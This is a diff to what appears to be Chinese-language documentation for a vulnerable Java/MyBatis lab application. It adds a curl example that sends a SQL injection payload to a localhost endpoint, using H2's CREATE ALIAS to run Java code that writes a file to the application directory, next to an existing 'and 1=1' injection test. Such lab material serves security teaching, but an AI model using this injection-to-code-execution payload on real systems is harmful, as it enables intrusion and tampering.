@@ -189,6 +189,9 @@ curl '127.0.0.1:8080/mybatis/insert2?name=abc'
 
 # 搜索
 curl '127.0.0.1:8080/mybatis/select2' -d "name=abc' and 1=1;--"
+
+# 在jar目录写文件
+curl '127.0.0.1:8080/mybatis/select2' -d $"name=';CREATE ALIAS func3 AS %24%24 void f(String cmd) throws java.io.IOException{(new java.io.FileOutputStream(System.getProperty(%22user.dir%22)%2B%22/hello.txt%22)).write(%22helloworld%22.getBytes());}%24%24;CALL func3('1');DROP ALIAS func3;--"
 ```
 
 #### log4j漏洞
